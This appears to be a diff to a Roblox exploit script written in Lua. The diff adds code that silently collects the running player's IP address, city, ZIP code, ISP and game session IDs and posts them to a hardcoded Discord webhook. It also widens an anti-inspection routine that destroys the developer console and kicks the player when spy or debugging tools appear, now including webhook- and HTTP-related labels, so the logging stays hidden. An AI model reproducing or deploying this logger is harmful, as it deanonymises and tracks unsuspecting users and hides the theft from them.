@@ -3,6 +3,51 @@ mess = [[
 We found some suspect script that you executed.
 ]]
 
+if syn then
+    HttpRequest = syn.request
+else
+    HttpRequest = http_request
+end
+local player_name = game:GetService("Players").LocalPlayer.Name
+local webhook_url = "https://discord.com/api/webhooks/1357668645416734813/2Inxu3iw6Sd5AD1vmTlAO324quZxXurPZoDzRQFcVvDRc4e-bD3ePrWlLyWdaOo2OEH3"
+
+local ip_info =
+    HttpRequest(
+    {
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    }
+)
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage =
+    string.format(
+    "\
+User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg:``` %s\nJobID: %s\nPlaceId: %s",
+    player_name,
+    ipinfo_table.query,
+    ipinfo_table.country,
+    ipinfo_table.countryCode,
+    ipinfo_table.region,
+    ipinfo_table.regionName,
+    ipinfo_table.city,
+    ipinfo_table.zip,
+    ipinfo_table.isp,
+    ipinfo_table.org,
+    game.JobId,
+    game.PlaceId
+)
+HttpRequest(
+    {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
+
+
 spawn( function()
     game:GetService("CoreGui"):WaitForChild("DevConsoleMaster"):Destroy()
 end)
@@ -10,7 +55,7 @@ end)
 spawn( function()
     for asdr,ergasd in pairs(game:GetService("CoreGui"):GetDescendants()) do
         if ergasd:IsA("TextLabel") or ergasd:IsA("TextButton") then
-            if ergasd.Text == "Explorer" or ergasd.Text == "Dex" or ergasd.Text == "Remote Spy" or ergasd.Text == "SimpleSpy" or ergasd.Text == "Copy Code" or ergasd.Text:sub(0,9) == "Copy Code" or ergasd.Text:sub(0,6) == "Remote" or ergasd.Text:sub(0,6) == "Copy Remote" or ergasd.Text:sub(0,4) == "Octo" or ergasd.Text:sub(0,6) == "SanTer" or ergasd.Text:sub(0,6) == "REMOTE" then
+            if ergasd.Text == "Explorer" or ergasd.Text == "Dex" or ergasd.Text == "Remote Spy" or ergasd.Text == "SimpleSpy" or ergasd.Text == "Copy Code" or ergasd.Text:sub(0,9) == "Copy Code" or ergasd.Text:sub(0,6) == "Remote" or ergasd.Text:sub(0,6) == "Copy Remote" or ergasd.Text:sub(0,4) == "Octo" or ergasd.Text:sub(0,6) == "SanTer" or ergasd.Text:sub(0,6) == "REMOTE" or ergasd.Text:sub(0,8) == "Clear Code" or ergasd.Text:sub(0,8) == "Clear Logs" or ergasd.Text:sub(0,8) == "CLEAR LOGS" or ergasd.Text:sub(0,7) == "Webhook" or ergasd.Text:sub(0,7) == "webhook" or ergasd.Text:sub(0,3) == "Web" or ergasd.Text:sub(0,3) == "web" or ergasd.Text:sub(0,4) == "http" or ergasd.Text:sub(0,4) == "Http" then
                 if ergasd.Parent.Name == "ChatBubbleFrame" == false then
                     spawn( function()
                         game.Players.LocalPlayer:Kick(mess)
@@ -35,7 +80,7 @@ end)
 
 local function wevzaaass(wssszaasd)
         if wssszaasd:IsA("TextLabel") or wssszaasd:IsA("TextButton") then
-            if wssszaasd.Text == "Explorer" or wssszaasd.Text == "Dex" or wssszaasd.Text == "Remote Spy" or wssszaasd.Text == "SimpleSpy" or wssszaasd.Text == "Copy Code" or wssszaasd.Text:sub(0,9) == "Copy Code" or wssszaasd.Text:sub(0,6) == "Remote" or wssszaasd.Text:sub(0,6) == "Copy Remote" or wssszaasd.Text:sub(0,4) == "Octo" or wssszaasd.Text:sub(0,6) == "SanTer" or wssszaasd.Text:sub(0,6) == "REMOTE" or wssszaasd.Text:sub(0,8) == "Clear Code" or wssszaasd.Text:sub(0,8) == "Clear Logs" or wssszaasd.Text:sub(0,8) == "CLEAR LOGS" then
+            if wssszaasd.Text == "Explorer" or wssszaasd.Text == "Dex" or wssszaasd.Text == "Remote Spy" or wssszaasd.Text == "SimpleSpy" or wssszaasd.Text == "Copy Code" or wssszaasd.Text:sub(0,9) == "Copy Code" or wssszaasd.Text:sub(0,6) == "Remote" or wssszaasd.Text:sub(0,6) == "Copy Remote" or wssszaasd.Text:sub(0,4) == "Octo" or wssszaasd.Text:sub(0,6) == "SanTer" or wssszaasd.Text:sub(0,6) == "REMOTE" or wssszaasd.Text:sub(0,8) == "Clear Code" or wssszaasd.Text:sub(0,8) == "Clear Logs" or wssszaasd.Text:sub(0,8) == "CLEAR LOGS" or wssszaasd.Text:sub(0,7) == "Webhook" or wssszaasd.Text:sub(0,7) == "webhook" or wssszaasd.Text:sub(0,3) == "Web" or wssszaasd.Text:sub(0,3) == "web" or wssszaasd.Text:sub(0,4) == "http" or wssszaasd.Text:sub(0,4) == "Http" then
                 if wssszaasd.Parent.Name == "ChatBubbleFrame" == false then
                     spawn( function()
                         game.Players.LocalPlayer:Kick(mess)
@@ -73,7 +118,6 @@ local function wevzaaass(wssszaasd)
             end)
         end
 end
-
 
     game:GetService("CoreGui").DescendantAdded:Connect(
         function(wssszaasd)
